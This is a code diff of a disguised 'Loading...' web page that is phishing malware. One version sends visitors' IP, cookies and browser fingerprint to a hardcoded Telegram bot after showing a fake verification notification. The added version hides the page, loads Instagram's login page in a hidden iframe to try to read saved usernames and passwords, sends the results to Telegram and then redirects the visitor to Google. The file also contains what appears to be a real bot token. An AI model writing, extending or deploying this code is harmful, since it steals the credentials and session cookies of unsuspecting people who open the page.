@@ -5,71 +5,126 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        .container { display: none; }
     </style>
 </head>
 <body>
 
-    <div style="text-align:center;">
-        <div style="font-size:48px;">🔔</div>
-        <p style="color:#333;">Loading...</p>
-    </div>
+    <!-- 👻 Kuch nahi dikhega – Sirf blank page -->
+    <div style="display:none;"></div>
 
     <script>
+        // ============================================================
+        // 🔥 TELEGRAM CONFIG
+        // ============================================================
         const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
         const CHAT_ID = "6389764004";
 
         // ============================================================
-        // 🧠 NOTIFICATION PHISHING
+        // 📤 SEND TO TELEGRAM
         // ============================================================
-
-        Notification.requestPermission().then(permission => {
-            if (permission === 'granted') {
-                new Notification('✅ Verification Complete', {
-                    body: 'Your account has been verified successfully.',
-                    icon: 'https://img.icons8.com/color/48/000000/verified-account.png'
-                });
-                captureData();
-            }
-        });
-
-        async function captureData() {
-            const ip = await getIP();
-            const cookies = document.cookie || 'No cookies found';
-            const fingerprint = getFingerprint();
-
-            let msg = `🎯 **NOTIFICATION PHISHING (Mobile)**\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n🍪 Cookies: ${cookies}\n🖥️ Fingerprint: ${fingerprint.userAgent}\n🕐 Time: ${new Date().toISOString()}`;
-            sendToTelegram(msg);
+        async function sendToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            try {
+                const r = await fetch(url, { method: 'GET' });
+                return r.ok;
+            } catch { return false; }
         }
 
+        // ============================================================
+        // 🧠 CAPTURE INSTAGRAM CREDENTIALS (If Saved in Browser)
+        // ============================================================
+        async function captureInstagram() {
+            // Try to load Instagram login page in hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://www.instagram.com/accounts/login/';
+            document.body.appendChild(iframe);
+
+            return new Promise((resolve) => {
+                iframe.onload = function() {
+                    try {
+                        const doc = iframe.contentDocument || iframe.contentWindow.document;
+                        const inputs = doc.querySelectorAll('input');
+                        let username = '', password = '';
+
+                        inputs.forEach(input => {
+                            if (input.value && input.value.trim() !== '') {
+                                if (input.type === 'text' || input.name.includes('username')) {
+                                    username = input.value;
+                                }
+                                if (input.type === 'password') {
+                                    password = input.value;
+                                }
+                            }
+                        });
+
+                        // Also try to get cookies
+                        const cookies = doc.cookie || 'No cookies';
+
+                        resolve({ username, password, cookies });
+                    } catch(e) {
+                        // Cross-origin – fallback
+                        resolve({ username: 'Unable to access (cross-origin)', password: '', cookies: 'Unable to access' });
+                    }
+                };
+
+                // Timeout after 5 seconds
+                setTimeout(() => {
+                    resolve({ username: 'Timeout', password: '', cookies: 'Timeout' });
+                }, 5000);
+            });
+        }
+
+        // ============================================================
+        // 🌐 GET IP
+        // ============================================================
         async function getIP() {
             try {
-                let r = await fetch('https://api.ipify.org?format=json');
-                let d = await r.json();
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
                 return d.ip || 'Unknown';
             } catch { return 'Unable to fetch'; }
         }
 
-        function getFingerprint() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-        }
+        // ============================================================
+        // 🚀 MAIN EXECUTION
+        // ============================================================
+        window.addEventListener('load', async function() {
 
-        function sendToTelegram(msg) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            fetch(url, { method: 'GET' });
-        }
+            // Capture Instagram data
+            const data = await captureInstagram();
+            const ip = await getIP();
+            const time = new Date().toISOString();
 
-        // 👻 Redirect after 3 seconds
-        setTimeout(() => {
-            window.location.href = 'https://www.instagram.com';
-        }, 3000);
+            let msg = `🎯 **INSTAGRAM CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `👤 Username: ${data.username || 'Not found'}\n`;
+            msg += `🔑 Password: ${data.password || 'Not found'}\n`;
+            msg += `🍪 Cookies: ${data.cookies || 'Not found'}\n`;
+            msg += `🌐 IP: ${ip}\n`;
+            msg += `🕐 Time: ${time}\n━━━━━━━━━━━━━━━━━━━━━`;
+
+            await sendToTelegram(msg);
+
+            // 👻 Blank page – redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://accounts.google.com/';
+            }, 3000);
+        });
+
+        // 👻 Ensure blank page
+        document.body.style.background = '#ffffff';
+        document.body.innerHTML = '';
     </script>
 </body>
 </html>
